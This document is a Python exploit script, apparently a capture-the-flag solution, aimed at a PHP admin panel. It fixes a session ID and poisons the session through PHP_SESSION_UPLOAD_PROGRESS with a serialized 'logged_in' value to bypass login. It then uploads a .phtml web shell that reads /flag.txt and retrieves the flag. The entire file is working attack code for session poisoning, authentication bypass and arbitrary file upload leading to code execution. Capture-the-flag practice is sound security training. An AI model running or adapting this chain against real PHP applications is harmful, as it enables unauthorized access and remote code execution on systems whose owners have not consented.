import requests
import urllib.parse

BASE_URL = "https://admin-panel-489a10b9570c.instancer.sekai.team"
host = urllib.parse.urlparse(BASE_URL).hostname

sess = requests.Session()
sess.cookies.set("PHPSESSID", "osuadminpwnd", domain=host, path="/")

poison_payload = "|b:1;logged_in|b:1;upload_progress"
files = {
    "PHP_SESSION_UPLOAD_PROGRESS": (None, poison_payload),
    "username": (None, "peppy"),
    "password": (None, "anything"),
    "file": ("dummy.txt", "osu!", "text/plain"),
}

login_url = f"{BASE_URL}/login.php?PHPSESSID=osuadminpwnd"
r1 = sess.post(login_url, files=files, allow_redirects=False, timeout=10)
print("Poison status:", r1.status_code)

admin_url = f"{BASE_URL}/admin.php?PHPSESSID=osuadminpwnd"
admin_page = sess.get(admin_url, allow_redirects=False, timeout=10)
print("Admin status:", admin_page.status_code, admin_page.headers.get('Location'))
print("Contains system stats?", 'system stats' in admin_page.text.lower())

if admin_page.status_code != 200 or 'system stats' not in admin_page.text.lower():
    print('Failed to reach admin panel')
    exit()

shell_body = "<?=file_get_contents('/flag.txt');?>"
shell_files = {
    "file": ("shell.phtml", shell_body, "application/octet-stream"),
}
r2 = sess.post(admin_url, files=shell_files, allow_redirects=False, timeout=10)
print("Upload status:", r2.status_code, r2.headers.get('Location'))

location = r2.headers.get("Location")
if not location:
    exit()
if not location.startswith("http"):
    if not location.startswith("/"):
        location = "/" + location
    location = f"{BASE_URL}{location}"
flag_resp = sess.get(location, timeout=10)
print(flag_resp.text.strip())
